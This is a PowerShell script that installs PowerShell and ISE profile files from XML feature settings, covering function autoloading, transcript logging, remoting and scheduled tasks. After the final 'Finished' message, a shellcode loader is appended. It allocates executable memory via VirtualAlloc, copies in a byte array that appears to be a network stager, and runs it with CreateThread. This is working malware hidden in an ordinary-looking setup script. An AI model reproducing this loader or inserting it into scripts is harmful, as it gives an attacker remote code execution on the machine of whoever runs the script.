param(
	[switch]
	$Force
)








if($Host.Version.Major -lt 2){
    throw "Only compatible with Powershell version 2 and higher"
}


if (-not (Test-Path $Profile)){

    
    Write-Host "Add a default profile script"
	New-Item -path $Profile -type file -force | Out-Null
}





    

$PSProfileConfig = Join-Path -Path (Get-Location).Path -ChildPath "Microsoft.PowerShell_profile.config.ps1"
if((Test-Path $PSProfileConfig) -and ($PSProfile -eq $null -or $Force)){
    iex $PSProfileConfig
}elseif($PSProfile -ne $null){
	Write-Host "Using global configuration of this session"
}elseif(-not (Test-Path $PSProfileConfig)){
    throw "Couldn't find $PSProfileConfig"
}







Get-childitem ($PSfunctions.Path) -Recurse | where{($_.Name.EndsWith("ps1")) -and (-not $_.PSIsContainer)} | foreach{. ($_.Fullname)}






$Features = @()
$Systemvariables = @()


Get-ChildItem -Path $PSconfigs.Path -Filter $PSconfigs.Profile.Filter -Recurse | %{
    [xml]$(get-content $_.FullName)} | %{
        $Features += $_.Content.Feature;$Systemvariables += $_.Content.Systemvariable}
        



        

$PPContent = @()
$PPISEContent = @()



$PPContent += @'
    
$Metadata = @{
Title = "Powershell Profile"
Filename = "Microsoft.PowerShell_profile.ps1"
Description = ""
Tags = "powershell, profile"
Project = ""
Author = "Janik von Rotz"
AuthorContact = "http://janikvonrotz.ch"
CreateDate = "2013-04-22"
LastEditDate = "2014-01-29"
Version = "7.1.1"
License = "This work is licensed under the Creative Commons Attribution-NonCommercial-NoDerivs 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-nd/3.0/ or send a letter to Creative Commons, 444 Castro Street, Suite 900, Mountain View, California, 94041, USA."
}

'@



 
$PPISEContent += @'
    
$Metadata = @{
Title = "Powershell ISE Profile"
Filename = "Microsoft.PowerShellISE_profile.ps1"
Description = ""
Tags = "powershell, ise, profile"
Project = ""
Author = "Janik von Rotz"
AuthorContact = "http://janikvonrotz.ch"
CreateDate = "2013-04-22"
LastEditDate = "2014-01-29"
Version = "7.1.1"
License = "This work is licensed under the Creative Commons Attribution-NonCommercial-NoDerivs 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-nd/3.0/ or send a letter to Creative Commons, 444 Castro Street, Suite 900, Mountain View, California, 94041, USA."
}

'@






$PPContent += $Content = @'

. '
'@ + (Join-Path -Path $PSProfile.Path -ChildPath "Microsoft.PowerShell_profile.config.ps1") + "'`n"
$PPISEContent += $Content




Write-Host "Add Autoinclude Functions to the profile script"
$PPContent += $Content = @'

Get-childitem ($PSfunctions.Path) -Recurse | where{($_.Name.EndsWith("ps1")) -and (-not $_.PSIsContainer)} | foreach{. ($_.Fullname)}

'@
$PPISEContent += $Content



	
Write-Host "Add Transcript Logging to the profile script"
$PPContent += @'

Start-Transcript -path $PSlogs.SessionFile
Write-Host ""

'@




function Check-ProfileFeatureStatus{

	param(
		[string]
		$Name
	)
	
	if($Features | Where{($_.Name -eq $Name) -and ($_.Status -eq "Enabled")}){
	
		$true
	
	}elseif($Features | Where{($_.Name -eq $Name) -and ($_.Status -eq "Disabled")}){
	
		$false
	
	}else{
	
		throw "Could not find feature definition for: $Name"	
	}
}








if(Check-ProfileFeatureStatus "Enable Open Powershell here"){
    
    Write-Host "Adding 'Open PowerShell Here' to context menu "
	(Get-ChildItem -Path $PStemplates.Path -Filter "Open PowerShell Here.reg" -Recurse) | %{Invoke-Expression "regedit /s '$($_.Fullname)'"}
		
}




if(Check-ProfileFeatureStatus "Get Quote Of The Day"){
    Write-Host "Add Get Quote Of The Day to the profile script"
	$PPContent += $Content = @'

Get-QuoteOfTheDay
Write-Host ""

'@
    $PPISEContent += $Content
}




if(Check-ProfileFeatureStatus "Git Update"){
	
    Update-PowerShellPowerUp
    
    Copy-PPConfigurationFile -Name $PStemplates.GitUpdate.Name -Force:$Force
    
    Update-ScheduledTask "Git Update"
}




if($Features | Where{($_.Name -contains "Log File Retention") -and ($_.Status -eq "Enabled") -and ($_.Run -match "asDailyJob")}){

    Copy-PPConfigurationFile -Name $PStemplates.LogFileRetention.Name -Force:$Force
    
    Update-ScheduledTask "Log File Retention"
}




if($Features | Where{($_.Name -contains "Log File Retention") -and ($_.Status -eq "Enabled") -and ($_.Run -match "withProfileScript")}){
                    
    Write-Host "Add Log File Retention to the profile script"
    $PPContent += $Content = @'

Delete-ObsoleteLogFiles

'@
    $PPISEContent += $Content
}




if(Check-ProfileFeatureStatus "Powershell Remoting"){
    
    Write-Host "Enabling Powershell Remoting"
	try{Enable-PSRemoting -Confirm:$false}catch{$Error}
	Set-Item WSMan:\localhost\Client\TrustedHosts "RemoteComputer" -Force
	Set-Item WSMan:\localhost\Shell\MaxMemoryPerShellMB 1024
	restart-Service WinRM -Confirm:$false
}




if(Check-ProfileFeatureStatus "Custom PowerShell Profile script"){

    Copy-PPConfigurationFile -Name $PStemplates.CustomPPscript.Name -Force:$Force
    
    Write-Host "Include Custom PowerShell Profile script"
	$PPContent += $(Get-Content (Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.CustomPPscript.Name -Recurse).Fullname) + "`n"
}




if(Check-ProfileFeatureStatus "Custom PowerShell Profile ISE script"){

    Copy-PPConfigurationFile -Name $PStemplates.CustomPPISEscript.Name -Force:$Force
    
    Write-Host "Include Custom PowerShell Profile script"
	$PPISEContent += $Content = $(Get-Content (Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.CustomPPISEscript.Name -Recurse).Fullname) + "`n"
}


if($SystemVariables -ne $Null){$SystemVariables | %{        
       
        $Path = Get-Path $_.Value
        
        if(Test-Path $Path){
        
            $SystemVariable = $_
        
            Set-EnvironmentVariableValue -Name $SystemVariable.Name -Value (";" + $Path) -Target $SystemVariable.Target -Add
  
        }else{
        
            Write-Error "Path: $Path doesn't exist. Not possible to add value to system variable: $($_.Name)"
        }
    }
}





$PPContent += $Content = @'

Set-Location $WorkingPath

'@
$PPISEContent += $Content


Write-Host "Creating PowerShell Profile Script"
Set-Content -Value $PPContent -Path $Profile


Write-Host "Creating PowerShell ISE Profile Script"
Set-Content -Value $PPISEContent -Path (Join-Path -Path (Split-Path $profile -Parent) -ChildPath "Microsoft.PowerShellISE_profile.ps1")

Set-Location $WorkingPath

Write-Host "Finished" -BackgroundColor Black -ForegroundColor Green
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xef,0x00,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

